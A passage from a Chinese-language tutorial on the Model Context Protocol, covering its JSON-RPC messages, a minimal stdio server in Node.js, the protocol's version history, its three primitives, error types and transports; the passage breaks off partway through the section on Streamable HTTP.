---
title: 'Agent Runtime（09）· MCP：一个 agent 怎么接住外面的整个世界'
description: 'MCP ≠ Function Calling，这是第一道翻车点。从协议三种消息类型讲到传输层、OAuth 2.1 授权、工具膨胀与语义路由。'
date: "2026-09-03"
series: Agent Runtime 从零到一
tags: [MCP, 协议, 从零到一]
outline: [2, 3]
---

# MCP 从零到一：一个 agent 怎么接住外面的整个世界

::: info 这是一份快照
本文的数字、常量、行数取自 **2026-08-31** 对 sid-code 源码的一次实读。
代码在动，这些数字会腐坏——引用其中任何一个之前，请按文中给出的命令在你自己的仓库里复跑一次。
:::

> **这份文档写给谁**
>
> 你听过 MCP，可能还配过一两个 MCP Server（在 `claude_desktop_config.json` 里粘过一段
> JSON），但没搞清楚：它和 Function Calling 到底什么关系、那个 `mcp__xxx__yyy` 的名字
> 是谁拼的、为什么工具一多 agent 就变笨变贵、面试问「你怎么设计 MCP 接入层」时该答什么。
>
> **和源文档的关系**：源材料是**调研结论**（给已经懂的人看，密度极高）。这一份是
> **教学版**：从「一次 JSON-RPC 请求」讲起，每个概念先给「为什么需要它」再给
> 「它长什么样」，最后才给「谁做得好、什么不该抄」。
>
> **⚠️ 先读 §1，别跳过。** 那一章讲的是「你手上的 MCP 知识大概率是过期的」，
> 而且这不是泛泛的免责声明——本文的三份源材料就实测踩中了这件事。
> 不先建立版本意识，后面每一章你都可能背下一个已经被删掉的机制。

---

## 关于文中数字与结论的三条使用纪律

这份文档混了两类事实，**可信度差一个量级**，全文逐处标注：

| 标记 | 含义 | 怎么用 |
| --- | --- | --- |
| 🔬 | **源码实读**（本仓 / claude-code，带文件名，可回溯复现） | 可以放心引用，但引用前复跑一次 |
| 📄 | **二手引用**（协议规范、博客、安全报告、厂商数字） | 引用时带出处和时间，别当永久事实 |
| 🌐 | **联网核验**（2026-08-31 当天从官方站点抓的） | 时效最强，但明天也会过期 |

三条纪律：

1. **数字是让你看见「真实数据长什么样」，不是让你背。** 「82% 的 MCP Server 有路径遍历漏洞」
   这个数字明年一定变；但「开放生态的安全成熟度滞后于采用速度」这个机制不变。
   **记机制，数字是配料。**
2. **面试引用必须带出处和时间。** 说「82% 有漏洞」会被追问来源；说
   「2026 上半年有份安全扫描报告称 82%，量级上说明生态还在重新发现经典漏洞阶段」
   才是能站住的表述。
3. **凡本文引用「现状」，一律是某时点快照。** 本文写作时实测抓到源材料里
   至少四处协议机制已被删除（见 §1），这就是最好的例子——**照抄就会讲一个不存在的协议**。

---

## 目录

| 章 | 内容 | 你会得到什么 |
| --- | --- | --- |
| [0](#c0) | 最小心智模型：MCP 到底是什么 | 能手搓一个 Server，不靠 SDK |
| [1](#c1) | ⚠️ 你读到的 MCP 文档大概率过期了 | **版本意识，本文第一课** |
| [2](#c2) | 三大原语：一个控制权分配框架 | 为什么 Resources 最被低估 |
| [3](#c3) | 数据层：JSON-RPC 2.0 讲透 | 三种消息 + 为什么不选 REST |
| [4](#c4) | 传输层：stdio vs Streamable HTTP | 两种部署形态的全部差异 |
| [5](#c5) | ★ 无状态化转向：2026-07-28 删了什么 | **协议演进的主线** |
| [6](#c6) | ★ 瓶颈在 Token，不在网络 | **最反直觉的一章** |
| [7](#c7) | 从协议到 harness：接进去要做十件事 | 🔬 协议之上的全部工程 |
| [8](#c8) | 安全：分层不是一道门 | 威胁模型 + 三层门控 |
| [9](#c9) | 可靠性：协议刻意不管运维 | 超时/重试/熔断/降级 |
| [10](#c10) | 企业落地：开放性撞上封闭性 | Gateway 为什么会成标配 |
| [11](#c11) | ★ 会静默坏掉的失效模式 | **教学层最值钱的一章** |
| [13](#c13) | 动手：五阶段实现路线 | 从 50 行到能用 |
| [附](#appendix) | 术语表 / 自检清单 / 延伸阅读 | 查漏 |

**建议读法**：完全没概念 → §0 → §1 → §2 → §4 → §6，先建立骨架；
准备面试 → 加读 §5 §7 §11 §12；要动手接入 → §7 §9 §13 是主线。

---
<a id="c0"></a>
## §0 最小心智模型：MCP 到底是什么

### 0.1 剥掉所有包装，它是一次 JSON-RPC 调用

MCP（Model Context Protocol，模型上下文协议）被宣传成「AI 的 USB-C」，
听起来很宏大。但**它的技术本体极其朴素**：

> **两个进程之间，用 JSON-RPC 2.0 互发消息。一个进程问「你有什么工具」，
> 另一个回答；然后前者说「帮我执行这个工具」，后者执行并返回结果。**

没有新的序列化格式，没有自定义二进制协议，没有 gRPC。就是**换行分隔的 JSON**。

不信的话，看一次真实的完整交互。这是最常见的形态——本地子进程，通过
stdin/stdout 通信：

```jsonc
// ① Client 问：你有什么工具？（写进 Server 进程的 stdin）
{"jsonrpc":"2.0","id":1,"method":"tools/list"}

// ② Server 答：我有一个（从 Server 进程的 stdout 读出）
{"jsonrpc":"2.0","id":1,"result":{"tools":[{
  "name":"get_weather",
  "description":"查询某个城市的当前天气",
  "inputSchema":{
    "type":"object",
    "properties":{"city":{"type":"string","description":"城市名，如 Nanjing"}},
    "required":["city"]
  }
}]}}

// ③ Client 说：执行它
{"jsonrpc":"2.0","id":2,"method":"tools/call",
 "params":{"name":"get_weather","arguments":{"city":"Nanjing"}}}

// ④ Server 答：结果
{"jsonrpc":"2.0","id":2,"result":{
  "content":[{"type":"text","text":"南京，晴，28°C"}],
  "isError":false
}}
```

**四条消息，一个协议讲完了。** 后面十三章讲的全部是「这四条消息在真实世界里
会出什么问题」——而问题多到需要十三章。

### 0.2 亲手搓一个：三十行，不装任何 SDK

理解一个协议最快的方式是不用 SDK 实现它。下面是一个能真正跑起来的
MCP Server（Node.js，零依赖）。**建议真的跑一遍**，比读十页规范有用：

```javascript
// weather-server.mjs —— 一个最小可用的 MCP Server（stdio 传输）
// 跑法：node weather-server.mjs，然后从 stdin 粘上面那些 JSON 进去

import { createInterface } from 'node:readline';

// 关键：stdout 只用来发协议消息，日志一律走 stderr。
// 往 stdout 里 console.log 一行调试信息 = 往协议流里插了一条非法消息，
// 对面的 JSON 解析当场失败。这是新手第一个坑，§11 会再讲。
const log = (...a) => console.error('[weather]', ...a);

const TOOLS = [{
  name: 'get_weather',
  description: '查询某个城市的当前天气。输入城市名，返回温度与天气状况。',
  inputSchema: {
    type: 'object',
    properties: { city: { type: 'string', description: '城市名，如 Nanjing' } },
    required: ['city'],
  },
  // annotations 告诉宿主「这个工具的行为特征」，宿主据此决定要不要弹确认框。
  // readOnlyHint: 只读 → 可以自动批准、可以并发执行。详见 §7.4
  annotations: { readOnlyHint: true },
}];

function send(msg) {
  // 一条消息一行（NDJSON）。注意是 \n 分隔，不是 SSE 的 \n\n
  process.stdout.write(JSON.stringify(msg) + '\n');
}

async function handle(req) {
  const { id, method, params } = req;

  // 老版本协议（2025-11-25 及更早）要求先握手。新版本（2026-07-28）删掉了
  // 这一步 —— 为什么删、怎么兼容，是 §1 和 §5 的主题。
  if (method === 'initialize') {
    return { jsonrpc: '2.0', id, result: {
      protocolVersion: '2025-03-26',
      capabilities: { tools: {} },          // 我只支持 tools，不支持 resources/prompts
      serverInfo: { name: 'weather', version: '0.1.0' },
    }};
  }

  if (method === 'tools/list') {
    return { jsonrpc: '2.0', id, result: { tools: TOOLS } };
  }

  if (method === 'tools/call') {
    const city = params?.arguments?.city;
    if (!city) {
      // 业务错误 ≠ 协议错误。这个区分很重要，§3.4 讲。
      return { jsonrpc: '2.0', id, result: {
        content: [{ type: 'text', text: '缺少参数 city' }],
        isError: true,
      }};
    }
    return { jsonrpc: '2.0', id, result: {
      content: [{ type: 'text', text: `${city}，晴，28°C` }],
      isError: false,
    }};
  }

  // 未知方法用 JSON-RPC 标准错误码 -32601
  return { jsonrpc: '2.0', id, error: { code: -32601, message: `未知方法: ${method}` } };
}

createInterface({ input: process.stdin }).on('line', async line => {
  if (!line.trim()) return;
  let req;
  try { req = JSON.parse(line); } catch { return log('非法 JSON，忽略'); }
  // 通知（notification）没有 id，按规范不能回复。§3.2 讲这个区别。
  if (req.id === undefined) return log('收到通知:', req.method);
  send(await handle(req));
});

log('已就绪，等待 stdin');
```

**跑完这一遍你就掌握了一件事**：MCP Server 不是什么复杂的服务端框架，
它是「一个读 stdin 写 stdout 的程序」。后面所有的复杂度都不在这里。

### 0.3 唯一的核心价值命题：M×N → M+N

MCP 出现之前，「让 AI 应用用上外部工具」是这样的：

```
                 ┌── GitHub 适配代码
Claude Desktop ──┼── Slack 适配代码
                 └── 数据库适配代码

                 ┌── GitHub 适配代码   ← 和上面那份功能一样，但要重写
Cursor       ────┼── Slack 适配代码       （因为两家应用的内部接口不同）
                 └── 数据库适配代码

M 个应用 × N 个工具 = M×N 份适配代码
```

MCP 的全部价值就是把这个乘法变成加法：

```
Claude Desktop ─┐                    ┌─ GitHub MCP Server
Cursor       ───┼── MCP 协议（标准）──┼─ Slack MCP Server
sid-code     ───┘                    └─ 数据库 MCP Server

M 个应用实现 Client + N 个工具实现 Server = M+N 份代码
```

📄 这就是「AI 的 USB-C」这个类比的实质：**USB-C 的价值不在于它电气性能多先进，
而在于所有设备同意用同一个插口**。协议的价值来自共识，不来自技术优越性。

**但这个类比有个必须点破的边界**（面试里能加分）：USB-C 是**物理**接口，
插上就是插上了；MCP 传的是**给 LLM 看的自然语言描述**。同一个 Server
接到不同模型上，效果可以差很远——因为工具选得对不对，取决于模型读不读得懂
那段 `description`。**MCP 保证了「连得上」，完全不保证「用得对」。**
§6 和 §11 都会回到这一点。

### 0.5 三个角色：Host / Client / Server

📄 规范里有三个角色，**面试很容易把 Host 和 Client 说混**：

```
┌─────────────── Host（AI 应用本体）─────────────────┐
│  管理用户交互、调 LLM、决定给不给权限                 │
│  例：Claude Desktop / Cursor / sid-code / Claude Code│
│                                                     │
│  ┌ Client A ┐  ┌ Client B ┐  ┌ Client C ┐          │
│  │ 1:1 连接 │  │ 1:1 连接 │  │ 1:1 连接 │          │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘          │
└───────┼─────────────┼─────────────┼────────────────┘
        │ stdio       │ stdio       │ Streamable HTTP
   ┌────▼─────┐  ┌────▼─────┐  ┌───▼──────────┐
   │ Server A │  │ Server B │  │  Server C     │
   │ 文件系统  │  │  Git     │  │  远程 Sentry  │
   └──────────┘  └──────────┘  └──────────────┘
```

| 角色 | 一句话职责 | 用户看得到吗 |
| --- | --- | --- |
| **Host** | AI 应用本体：管 UI、管 LLM 调用、管权限决策 | 看得到，就是你用的那个软件 |
| **Client** | 协议客户端：和**一个** Server 保持 1:1 连接 | 看不到，是 Host 的内部组件 |
| **Server** | 暴露能力（工具/资源/模板）的服务进程 | 间接看到（配置文件里那些名字） |

**为什么是 1:1 而不是一个 Client 连多个 Server**：隔离。一个 Server 崩了、
挂了、认证过期了，只影响它自己那条连接。如果共用一个 Client，一个 Server
的协议错误可能把整条通道搞乱。**这是用少量内存换故障隔离**，很值。

### 0.6 本章自检

能回答这四个问题再往下：

1. 为什么 MCP Server 的日志**必须**走 stderr，往 stdout 打一行会发生什么？
2. 「MCP 是远程 Function Calling」这句话错在哪？说出两者所在的层次。
3. 一个 Server 报出了工具，但模型从来不调它。这是 MCP 的问题吗？该往哪查？
4. 为什么 Client 和 Server 是 1:1，这个设计买到了什么？

---
<a id="c1"></a>
## §1 ⚠️ 你读到的 MCP 文档大概率过期了

这一章不讲协议内容，讲**怎么读协议文档**。它排在第一是因为：
**如果你不先建立版本意识，后面每一章你都可能背下一个已经被删掉的机制。**

### 1.1 一个活体证据：本文的三份源材料

🌐 本文写作时（2026-08-31）做了一次核验，结果值得完整摆出来。三份源材料写于
**2026-04**，当时它们是准确的。四个月后，它们教的以下机制**已被官方删除**：

| 源材料教的（2026-04 时正确） | 2026-07-28 规范的实际状态 | 后果 |
| --- | --- | --- |
| `initialize` + `notifications/initialized` 握手，「先协商后操作」 | **已删除**。协议改为无状态，每个请求自带版本与能力 | 照着实现 = 实现一个已废弃的握手 |
| `ping` 方法做心跳检测 | **已删除** | 健康检查方案要重做 |
| SSE `Last-Event-ID` 断线重连、消息补发 | **已删除**。流断了就是断了，客户端必须用**新的 request id** 重发 | 「MCP 支持断点恢复」这句话现在是错的 |
| Tasks 是「2026 路线图的新原语」 | 已实现，但**移出核心协议**，变成官方扩展 `io.modelcontextprotocol/tasks` | 说它是「核心原语」不准确 |

**注意这里的教训不是「那三份文档写得差」**——它们在写作时是对的，而且质量很高。
教训是：

> **协议类知识的半衰期比你想的短。MCP 从 2024-11 到 2026-07 出了 5 个版本，
> 平均不到 5 个月一个，且每个都含破坏性变更。**

### 1.2 完整版本时间线

🌐 五个正式发布的修订版（截至 2026-08-31）：

| 版本 | 时间 | 主要变化 | 状态 |
| --- | --- | --- | --- |
| `2024-11-05` | 2024.11 | 初版：确立 Client-Server 模型 + 三大原语 | Final |
| `2025-03-26` | 2025.03 | **Streamable HTTP** 传输；OAuth 2.1 授权框架 | Final |
| `2025-06-18` | 2025.06 | 结构化输出；Elicitation；Server 被明确为 OAuth Resource Server；要求 Resource Indicators（RFC 8707）；**移除 JSON-RPC 批处理** | Final |
| `2025-11-25` | 2025.11 | 授权发现增强（OIDC Discovery）；增量 scope 同意；实验性 Tasks；JSON Schema 2020-12 | Final |
| **`2026-07-28`** | 2026.07 | **协议核心无状态化**；Extensions 框架；Tasks 转扩展；MRTR 模式；正式废弃政策 | **Current** |

版本号格式是 `YYYY-MM-DD`，语义是「**最后一次发生破坏性变更的日期**」——
向后兼容的改动不会升号。所以看到 `2026-07-28` 要理解成
「这一天之后没有再破坏兼容性」，不是「这天发了个小更新」。

📄 一个值得记住的节奏细节：`2026-07-28` 在 **2026-05-21 就以 RC 形式公开**，
到 7-28 才转正。**协议的破坏性变更是有预告期的**，盯 RC 就能提前两个月准备。

### 1.3 判断一份 MCP 资料是否过期：五个探针

这是本章最实用的部分。拿到任何 MCP 资料（博客、教程、别人的代码、你自己半年前的笔记），
搜这五个词，**命中即说明它写于 2026-07-28 之前**：

| 探针 | 命中说明什么 | 现在的正确做法 |
| --- | --- | --- |
| `initialize` 被描述为必需步骤 | ≤ 2025-11-25 | 每请求在 `_meta` 带 `io.modelcontextprotocol/protocolVersion` |
| `Mcp-Session-Id` | ≤ 2025-11-25 | 无会话；要跨调用状态就用**服务端签发的 handle 当普通工具参数传** |
| `ping` | ≤ 2025-11-25 | 已删；健康检查改用 `server/discover` 或业务级探测 |
| `Last-Event-ID` / 「支持断点续传」 | ≤ 2025-11-25 | 已删；流断了用新 request id 整个重发 |
| `resources/subscribe` | ≤ 2025-11-25 | 统一到 `subscriptions/listen` 单一长连 POST 流 |

```bash
# 拿到一份资料，先跑这个（会漏报但不会误报，够用了）
grep -nEw 'initialize|Mcp-Session-Id|ping|Last-Event-ID|resources/subscribe' 那份文档.md
# 有命中 → 这份资料的协议层部分停在 2025 年，读它的架构思想，别照抄它的机制
```

⚠️ **这个探针的正确读法**：零命中**不等于**这份资料是新的（可能它压根没讲传输层）。
它只能做**单向判断**——有命中就一定旧，没命中不能证明新。这个「单向探针」的思路
在 §11 会反复出现，因为它是排查各类「静默失效」的通用手法。

### 1.4 那么该怎么读这份文档（以及任何 MCP 资料）

本文的处理办法，也建议你之后照这个办法读别人的资料：

1. **机制分两类看**：「为什么这么设计」几乎不过期，「字段叫什么、方法名是什么」
   随时过期。前者值得背，后者查规范。
2. **本文凡讲到已删机制，一律明确标注「≤2025-11-25 的做法」**，
   并给出新版对应做法——因为**你在真实项目里一定会同时遇到两代 Server**
   （生态迁移不可能一夜完成），两代都要认得。
3. **官方规范是唯一权威**：`modelcontextprotocol.io/specification/<版本号>`。
   URL 里带版本号，这是它的设计——**永远显式指定你在读哪一版**。

### 1.6 本章自检

1. 你的同事说「MCP 支持断线重连，靠 Last-Event-ID」。他的知识停在哪个版本？
2. 版本号 `2026-07-28` 的语义是什么？为什么不用 `v2.3.1` 这种号？
3. 五个探针里，「零命中」能不能证明一份资料是最新的？为什么？
4. 如果你要在生产里同时支持 2025 和 2026 两代 Server，第一件要做的事是什么？

---
<a id="c2"></a>
## §2 三大原语：这不是三种功能，是一个控制权分配框架

### 2.1 先说清这一章为什么重要

📄 「MCP 有 Tools、Resources、Prompts 三大原语」是每篇入门文都会写的一句话。
但大多数文章把它讲成**三种功能**，这就丢掉了全部深度。正确的理解是：

> **三大原语是按「谁来决定触发时机」切分的。它回答的问题是
> 「谁有权决定信息流动和动作触发」——这是 agent 系统安全性和可控性的地基。**

一句话对照：

| 原语 | 谁控制 | 回答什么问题 | 类比 |
| --- | --- | --- | --- |
| **Tools** | **模型**控制 | AI 需要**做**什么？ | API 端点 |
| **Resources** | **应用**控制 | AI 需要**知道**什么？ | 文件系统 / 附件 |
| **Prompts** | **用户**控制 | 用户想要**怎样的交互**？ | 斜杠命令 |

**为什么这个切分是必要的**：因为「不是所有外部信息都应该让 LLM 自主决定是否使用」。
如果一切都是 Tool，那么「当前打开的文件内容要不要给模型看」这件事就交给了模型自己
——而模型可能忘记调、可能调晚了、可能调错文件。**有些事情不该由模型决定。**

### 2.2 Tools：模型自主决策的可执行函数

这是最常用、也是唯一被生态广泛实现的原语。

**核心特征**：

- **模型控制**：LLM 根据用户意图自主决定调不调、何时调、传什么参数
- **有副作用**：可以改外部状态（写文件、发请求、改数据库）
- **因此需要用户确认**：宿主通常在执行前弹确认框

**三个协议方法**：

```
tools/list                          → 发现有哪些工具
tools/call                          → 执行一个工具
notifications/tools/list_changed    → Server 通知「我的工具列表变了」
```

**一个工具定义的完整字段**（📄 规范字段，🔬 注释是实践要点）：

```jsonc
{
  "name": "search_issues",              // 唯一标识，模型用它调用
  "title": "Search GitHub Issues",      // 给人看的显示名
  "description": "在 GitHub 仓库中搜索 issue。",
  //  ↑ 🔬 这一行是全场最重要的字段。模型不看你的代码实现，
  //    它选不选这个工具，100% 取决于这段文字。§6.4 专门讲怎么写。
  "inputSchema": {                      // JSON Schema，模型据此生成参数
    "type": "object",
    "properties": {
      "repo":  { "type": "string", "description": "owner/repo 格式" },
      "query": { "type": "string", "description": "搜索关键词" }
    },
    "required": ["repo", "query"]
  },
  "outputSchema": { /* 可选：定义返回值结构 */ },
  "annotations": {                      // 行为标注 —— 驱动宿主的安全决策
    "readOnlyHint": true,               // 只读 → 可自动批准、可并发
    "destructiveHint": false,           // 破坏性 → 必须显式确认
    "idempotentHint": true,             // 幂等 → 可安全重试
    "openWorldHint": false              // 会碰外部世界（如公网）
  }
}
```

🔬 **`annotations` 是最容易被忽略但最有工程价值的字段**。它让 Server
在不了解宿主内部概念的前提下，把「这个工具危不危险」告诉宿主。
sid-code 和 Claude Code 都把它映射到了自己的权限/并发系统（§7.4 给映射表）。

⚠️ **一个必须知道的安全边界**：`annotations` 是**提示（hint），不是保证**。
名字里的 `Hint` 就是这个意思——它由 Server 自己声明，**恶意 Server 可以
把一个删库工具标成 `readOnlyHint: true`**。所以它能用来
「把只读操作自动放行以提升体验」，**绝不能用来做唯一的安全判据**。
📄 规范原文也是这个态度：客户端不应仅凭 annotations 做信任决策。

### 2.3 Resources：最被低估、但可能最重要的原语

📄 这是本章的核心洞察，也是面试里最能拉开差距的一段。

**Resources 是应用层控制的只读数据注入**。特征：

- **应用控制**：由 Host/Client 决定何时把数据塞进上下文，模型不直接触发
- **只读**：不改外部状态
- **URI 标识**：每个资源有唯一 URI（`file:///path/to/f`、`db://mydb/schema`）

**为什么不能用 Tool 代替 Resource？** 这是高频追问，四个维度：

| 维度 | 用 Tool 读数据 | 用 Resource 提供数据 |
| --- | --- | --- |
| 谁触发 | 模型自己决定 | 应用层决定 |
| Token / 轮次 | 要花一整轮（工具定义 + 调用 + 结果） | 直接注入，**零额外轮次** |
| 可预测性 | **模型可能忘记调、或调晚了** | 应用层保证数据一定在上下文里 |
| 适用场景 | 动态查询（「帮我查一下 X」） | 静态上下文（「这是当前文件」） |

**一个具体到不能再具体的例子**：coding agent 里，
「用户当前打开的那个文件」应该是 **Resource**（自动注入），
而不是让模型每次都调 `read_file` 工具。后者多一轮交互、多花 token，
而且**模型可能压根不去读就开始改代码**。

**两种发现机制**：

```
resources/list                    → 具体资源列表（如项目里所有文件）
resources/templates/list          → URI 模板（如 db://{database}/schema）
                                     Client 按参数动态构造 URI
```

#### 📄 为什么说它「被低估」——一个生态现实

截至 2026 年，**绝大多数 MCP Server 只实现了 Tools**，Resources 支持极其薄弱。
原因不难理解：

1. 宿主应用（Claude Desktop / Cursor 等）对 Resources 的 UI 支持不完善
2. 开发者习惯了「万物皆 Tool」的思维
3. Tools 最直观、ROI 最高

**但从架构角度看这个偏好是错的**。因为 Resources 解决的问题
（应用层控制上下文注入）比 Tools（模型自主调用）更接近
**Context Engineering 的核心理念**——「在正确的时间给模型正确的信息」。
Resources 是**可预测的**，Tools 是**不可预测的**。

🎤 **面试话术**：「大多数人把 MCP 等同于远程 Function Calling，只关注 Tools。
但我认为 Resources 才是 MCP 最重要的设计创新——它把『给什么上下文』的决策权
从模型交回了应用层。这和 Context Engineering 的理念完全一致：
上下文该由应用精心组织，而不是让模型自己去翻。生态现在几乎只实现 Tools，
这是在放弃 MCP 最有价值的那一半。」

### 2.4 Prompts：用户触发的交互模板

生态里支持最薄弱的一个，但设计意图很清楚：
**把复杂交互流程封装成用户可发现、可触发的标准模板**。

- **用户控制**：用户通过 UI（斜杠命令、菜单）显式触发，**模型和应用都不能自动调用**
- **参数化**：可接受参数（`/review language=python`），支持自动补全
- **返回消息列表**：不是返回一段文本，而是返回结构化的 `messages` 数组，
  且**可以内嵌 Resource 引用**——这是它比「写在 system prompt 里」强的地方

```
prompts/list   → 发现有哪些模板
prompts/get    → 取模板内容，返回 {messages: [{role, content}]}
```

**为什么不直接写在 system prompt 里？** 三个理由：

1. **可发现性**：用户能浏览 Server 提供的所有模板，不用记指令
2. **可复用性**：同一个模板能被不同宿主应用使用
3. **动态性**：能内嵌 Resource 引用，做到「模板 + 实时数据」

### 2.5 三者协同：一个完整工作流

以「代码审查」为例，三个原语各就各位：

```
① 用户输入 /review                          ← Prompts（用户决定做什么任务）
        ↓
② 模板里内嵌了当前 PR 的 diff，自动注入上下文   ← Resources（应用决定给什么信息）
        ↓
③ 模型分析后决定调 create_github_comment      ← Tools（模型决定怎么执行）
```

**这个三层就是关注点分离**：
用户决定「做什么任务」，应用决定「给什么上下文」，模型决定「怎么执行」。

### 2.6 一个必须点破的现实：能力协商

📄 Server 不一定实现全部三种原语，所以要**先协商**。
（⚠️ 注意：协商的**形式**在 `2026-07-28` 变了，见 §5；这里讲的是**语义**，语义没变。）

```jsonc
// Server 声明自己支持什么
{
  "capabilities": {
    "tools":     { "listChanged": true },   // 有工具，且支持变更通知
    "resources": { "subscribe": true },     // 有资源，且支持订阅变更
    "prompts":   { "listChanged": true }    // 有模板，且支持变更通知
  }
}
```

Client 据此知道**哪些方法能调**。调一个 Server 没声明的能力，得到的是错误
——所以**能力协商不是礼貌，是必需**。

### 2.7 本章自检

1. 用一句话说出三大原语的切分依据（不是「三种功能」）。
2. coding agent 里「当前打开的文件」该做成 Tool 还是 Resource？给出两个理由。
3. `readOnlyHint: true` 能不能作为「自动放行这个工具」的唯一依据？为什么？
4. 为什么 Prompts 规定「模型和应用都不能自动调用」？这个限制买到了什么？

---
<a id="c3"></a>
## §3 数据层：JSON-RPC 2.0 讲透

### 3.1 先建立分层心智模型

MCP 把协议切成两层，**这个切分是理解一切的前提**：

```
┌──────────────────────────────────────────────┐
│  数据层（内层）：JSON-RPC 2.0                  │
│  ─ 消息长什么样（Request / Response / Notify） │
│  ─ 有哪些方法（tools/list、tools/call…）      │
│  ─ 生命周期与能力协商                          │
│  ★ 这一层定义「说什么」                        │
└──────────────────────────────────────────────┘
                      ↕ 完全解耦
┌──────────────────────────────────────────────┐
│  传输层（外层）：stdio / Streamable HTTP       │
│  ─ 字节怎么送过去                              │
│  ★ 这一层定义「怎么送」                        │
└──────────────────────────────────────────────┘
```

**关键性质：传输层对数据层透明。** 同一条 `tools/call` 消息，
跑在 stdio 上和跑在 HTTP 上**内容完全一样**。这个解耦让 MCP
能适配不同部署场景而不改协议语义——也是为什么 §5 那次
「传输层大改」没有动三大原语的语义。

### 3.3 为什么选 JSON-RPC，不选 REST 或 gRPC

📄 这是很好的设计决策题，答案要落在**工程约束**上：

| 方案 | 优势 | 为什么没选 |
| --- | --- | --- |
| **JSON-RPC 2.0** | 轻量、原生支持通知、**不绑定传输** | ✅ 被选中 |
| REST | 生态成熟、HTTP 原生 | **资源导向不匹配 RPC 语义**；无通知机制。「调用一个工具」本质是 RPC，不是对资源做 CRUD |
| gRPC | 高性能、强类型 | 需要 Protobuf 工具链、浏览器支持差。**对本地 stdio 通信过重** |

**最关键的那条理由是「不绑定传输」**：JSON-RPC 只规定消息长什么样，
不规定怎么送。这正好匹配 MCP 要同时支持
「本地子进程 stdin/stdout」和「远程 HTTP」的需求。
如果选了 REST，「跑在 stdin 上的 REST」这个说法本身就很荒谬。

🎤 **面试话术**：「选 JSON-RPC 的核心原因是它和传输层解耦。
MCP 需要同一套语义既跑在本地 stdio 上又跑在远程 HTTP 上，
REST 的资源语义和 HTTP 动词绑得太紧，做不到这件事。
另外工具调用本质是 RPC 不是资源操作，用 REST 会很别扭——
`POST /tools/search_issues/invoke` 这种 URL 已经是在用 REST 假装 RPC 了。」

### 3.4 两种「错误」必须分清（高频实现 bug）

这是新手最容易搞混的一处，**而且搞混了不报错，只是行为变怪**：

```jsonc
// ① 协议级错误 —— 用 error 字段。「你这个请求我没法处理」
{"jsonrpc":"2.0","id":1,"error":{"code":-32601,"message":"未知方法"}}

// ② 业务级错误 —— 用 result + isError。「请求我收到了，执行结果是失败」
{"jsonrpc":"2.0","id":1,"result":{
  "content":[{"type":"text","text":"文件不存在: /tmp/x"}],
  "isError":true
}}
```

**判据一句话**：

> **协议错误 = 消息本身有问题（方法不存在、参数格式非法）→ 用 `error`。
> 业务错误 = 消息没问题，是执行失败了（文件不存在、API 返回 404）→ 用 `result.isError`。**

**为什么这个区分至关重要**：因为两者**给谁看**不同。

- `error` 是给**程序**看的：Client 层处理，可能触发重试或标记连接异常。
  **模型通常看不到它。**
- `result.isError` 是给**模型**看的：内容会进对话历史，
  模型读到「文件不存在」后可以**自己换个路径重试**。

🔬 **搞混的后果**：把「文件不存在」返回成协议 `error`，
模型就永远不知道发生了什么——它只看到工具调用失败了，
既不知道原因也没法自我纠正，于是**原地重试同一个错误参数**。
这是 §11 讲的「空转」的常见成因之一。

📄 一个 `2026-07-28` 的细节：资源未找到的错误码从 `-32002` 改成了
`-32602`（Invalid Params），以对齐 JSON-RPC 规范。同时规范划定了错误码分区：
`-32000`~`-32019` 留给实现自定义，`-32020`~`-32099` 保留给 MCP 规范。

### 3.5 生命周期：两代协议的分水岭

**≤ 2025-11-25 的做法**（📄 你在绝大多数教程里看到的就是这个）：

```
Client                          Server
  │──── initialize ────────────→│  版本协商 + 能力声明
  │←─── initialize result ──────│  Server 声明支持的原语
  │──── notifications/initialized ─→│  Client 确认就绪
  │                              │
  │═════ 操作阶段 ═══════════════│  tools/list、tools/call…
  │──── ping ──────────────────→│  心跳（可选）
  │←─── notifications/* ────────│  Server 主动通知
  │──── close ─────────────────→│
```

三条规则：① 版本不兼容就终止连接；② 双方通过 `capabilities` 声明能力；
③ **在 `initialized` 发出前不能发任何操作请求**。

**2026-07-28 的做法**：🌐 **上面这套握手被整个删掉了。**
每个请求自带版本与能力，放在 `_meta` 里：

```jsonc
{
  "jsonrpc":"2.0","id":1,"method":"tools/list",
  "_meta":{
    "io.modelcontextprotocol/protocolVersion":"2026-07-28",
    "io.modelcontextprotocol/clientCapabilities":{ /* … */ },
    "io.modelcontextprotocol/clientInfo":{"name":"sid-code","version":"0.1.x"}
  }
}
```

版本不匹配时 Server 返回 `UnsupportedProtocolVersionError`（`-32022`），
**并列出它支持哪些版本**，Client 可以换个版本重试。
另外新增了一个**必须实现**的 RPC `server/discover`，
Client 可以在任何请求之前调它，一次拿到「支持的版本 + 能力 + 身份」。

**为什么要这么改**——这是 §5 整章的主题，一句话预告：
**有状态握手让 MCP 没法被普通 HTTP 基础设施承载。**

### 3.6 本章自检

1. 一条 JSON-RPC 消息没有 `id`，这说明什么？收到它该怎么处理？
2. 「文件不存在」该用 `error` 还是 `result.isError`？说出理由，并说明搞错的后果。
3. 为什么 MCP 选 JSON-RPC 而不是 REST？给出那条最关键的理由。
4. `2026-07-28` 之后，Client 怎么告诉 Server 自己说哪个版本的协议？

---
<a id="c4"></a>
## §4 传输层：stdio vs Streamable HTTP

### 4.1 stdio：本地子进程

**这是最常见的形态**，你配过的 MCP Server 九成是这个：

```
┌──────────────── Host 进程 ─────────────────┐
│  MCP Client                                │
│      │ spawn 子进程                         │
│      ▼                                     │
│  ┌─────────── Server 子进程 ────────────┐  │
│  │  stdin  ← Client 写入 JSON-RPC 请求   │  │
│  │  stdout → Client 读取 JSON-RPC 响应   │  │
│  │  stderr → 日志（【不是】协议消息！）   │  │
│  └──────────────────────────────────────┘  │
└────────────────────────────────────────────┘
```

配置长这样：

```jsonc
{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "/Users/me/code"],
      "env": { "LOG_LEVEL": "info" }
    }
  }
}
```

四个要点：

1. **一条消息一行**（NDJSON），用 `\n` 分隔。⚠️ 注意**不是** SSE 的 `\n\n`。
2. **stderr 是日志专用**。往 stdout 打日志 = 往协议流插非法消息 → 对面解析失败。
   这是 §11.1 那条 P0 级坑。
3. **零网络开销**，延迟是微秒级。
4. **进程生命周期就是会话生命周期**——进程死了，会话就没了，没有恢复机制。

### 4.2 Streamable HTTP：远程通信（2025-03-26 引入）

远程形态。它替代了初版的 HTTP+SSE 方案（📄 后者已在 `2026-07-28` 被正式标记为
Deprecated）。核心设计是**单一端点 + SSE 可选**：

```
